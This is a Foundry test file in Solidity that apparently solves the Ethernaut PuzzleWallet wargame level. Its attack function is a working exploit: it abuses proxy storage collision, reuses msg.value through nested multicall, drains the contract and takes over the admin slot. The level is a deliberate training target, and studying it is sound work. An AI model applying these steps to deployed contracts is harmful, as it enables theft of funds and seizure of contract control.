// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/Ethernaut.sol";
import "../src/levels/24-PuzzleWallet/PuzzleWallet.sol";
import "../src/levels/24-PuzzleWallet/PuzzleProxy.sol";
import "../src/levels/24-PuzzleWallet/PuzzleWalletFactory.sol";

contract PuzzleWalletTest is Test, BaseTest {
    PuzzleWallet public level;

    constructor() {
        levelFactory = new PuzzleWalletFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(this._createLevelInstance{value: 0.001 ether}());
        level = PuzzleWallet(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() public override {
        vm.startPrank(attacker);

        bytes32 _IMPLEMENTATION_SLOT = bytes32(
            uint256(keccak256("eip1967.proxy.implementation")) - 1
        );
        bytes32 logicAddrBytes32 = vm.load(
            address(levelAddr),
            _IMPLEMENTATION_SLOT
        );
        address logicAddr = address(bytes20(logicAddrBytes32 << 96));

        PuzzleProxy proxy = PuzzleProxy(levelAddr);
        PuzzleWallet logic = PuzzleWallet(logicAddr);

        // 1. Initialize the logic contract
        logic.init(100 ether);

        // 2. Add pending upgrade admin
        proxy.proposeNewAdmin(attacker);

        // 3. Whitelist the proxy contract
        (bool success, ) = address(proxy).call(
            abi.encodeWithSignature("addToWhitelist(address)", attacker)
        );
        require(success, "Whitelisting failed");

        // 4. Reuse msg.value by calling multicall() from the proxy contract
        //    so that it calls deposit() twice in one call
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSignature("deposit()");
        multicallData[1] = abi.encodeWithSignature(
            "multicall(bytes[])",
            depositData
        );

        (success, ) = address(proxy).call{value: 0.001 ether}(
            abi.encodeWithSignature("multicall(bytes[])", multicallData)
        );
        require(success, "Multicall deposit failed");

        // 5. Drain the contract
        (success, ) = address(proxy).call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                attacker,
                0.002 ether,
                ""
            )
        );
        require(success, "Execute failed");

        // 6. Set maxBalance to attacker's address which will override proxy's owner
        (success, ) = address(proxy).call(
            abi.encodeWithSignature("setMaxBalance(uint256)", attacker)
        );
        require(success, "setMaxBalance failed");

        vm.stopPrank();
    }
}
